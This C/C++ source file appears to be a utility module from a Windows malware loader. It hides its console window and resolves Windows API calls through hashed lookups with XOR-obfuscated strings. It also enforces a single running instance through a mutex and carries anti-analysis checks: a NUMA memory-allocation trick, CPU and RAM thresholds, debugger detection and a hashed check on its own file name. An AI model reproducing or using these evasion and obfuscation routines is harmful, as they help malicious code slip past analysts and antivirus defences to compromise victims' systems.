#include "utils.hpp"

void hideWindow()
{
	HWND hwnd = GetConsoleWindow();
	m_showWindowPtr showWindow = (m_showWindowPtr)m_GetProcAddressEx(TEXT(fheXOR("1a04091d445e41130003", fXOR("E]F", '*'))), 396468350);
	showWindow(hwnd, SW_HIDE);
}

int onlyMe()
{
	m_createMutexPtr createMutex = (m_createMutexPtr)m_GetProcAddressEx(TEXT("kernel32.dll"), -530587496);
	HANDLE mutex = createMutex(NULL, TRUE, fheXOR("3c1e1e0646545f43", fXOR("E]F", '*')));

	// Check if the mutex is already owned by another instance
	if (GetLastError() == ERROR_ALREADY_EXISTS)
	{
		CloseHandle(mutex); // Close the mutex handle
		return 0;
	}
	return 1;
}

char *generateUUID()
{
	static char uuid[UUID_LENGTH + 1];
	const char *chars = "0123456789abcdef";
	int i;

	srand((unsigned int)time(NULL));

	for (i = 0; i < UUID_LENGTH; i++)
	{
		if (i == 8 || i == 13 || i == 18 || i == 23)
		{
			uuid[i] = '-';
		}
		else
		{
			uuid[i] = chars[rand() % RANDOM_RANGE];
		}
	}

	uuid[UUID_LENGTH] = '\0';
	return uuid;
}

int writePlainText(const char *filename, const char *text)
{

	FILE *file = fopen(filename, "w");
	if (file == NULL)
	{
		printf("Error opening file %s\n", filename);
		return 1;
	}

	fprintf(file, "%s", text);

	fclose(file);

	return 0;
}

BOOL checkNUMA()
{
	LPVOID mem = NULL;
	m_VirtualAllocExNumaPtr myVirtualAllocExNuma = (m_VirtualAllocExNumaPtr)m_GetProcAddressEx("kernel32.dll", 644638202);
	m_getCurrentProcessPtr getCurrentProcess = (m_getCurrentProcessPtr)m_GetProcAddressEx("kernel32.dll", 761451162);
	mem = myVirtualAllocExNuma(getCurrentProcess(), NULL, 1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE, 0);
	if (mem != NULL)
	{
		return false;
	}
	else
	{
		return true;
	}
}

BOOL checkResources()
{
	SYSTEM_INFO s;
	MEMORYSTATUSEX ms;
	DWORD procNum;
	DWORD ram;

	// check number of processors
	m_getSystemInfoPtr getSystemInfo = (m_getSystemInfoPtr)m_GetProcAddressEx("kernel32.dll", 530122817);
	getSystemInfo(&s);
	procNum = s.dwNumberOfProcessors;
	if (procNum < 2)
		return false;

	// check RAM
	ms.dwLength = sizeof(ms);
	m_globalMemoryStatusExPtr globalMemoryStatusEx = (m_globalMemoryStatusExPtr)m_GetProcAddressEx("kernel32.dll", 152459865);
	globalMemoryStatusEx(&ms);
	ram = ms.ullTotalPhys / 1024 / 1024 / 1024;
	if (ram < 2)
		return false;

	return true;
}

int whoami(char *name)
{
	size_t len = strlen(name);
	char *last_value = NULL;
	for (int i = len - 1; i >= 0; i--)
	{
		if (name[i] == '\\')
		{
			last_value = &name[i + 1];
			break;
		}
	}

	if (hash(last_value, strlen(last_value)) != 958769279)
	{
		return false;
	}

	return true;
}

int runLikeHell(char **argv)
{
	if (checkNUMA())
	{
		return false;
	}
	if (checkResources() == false)
	{
		return false;
	}
	if (IsDebuggerPresent())
	{
		return false;
	}
	return true;
}

int hash(const char *s, const int n)
{
	long long p = 31, m = 1e9 + 7;
	long long hash = 0;
	long long p_pow = 1;
	for (int i = 0; i < n; i++)
	{
		hash = (hash + (s[i] - 'a' + 1) * p_pow) % m;
		p_pow = (p_pow * p) % m;
	}
	return hash;
}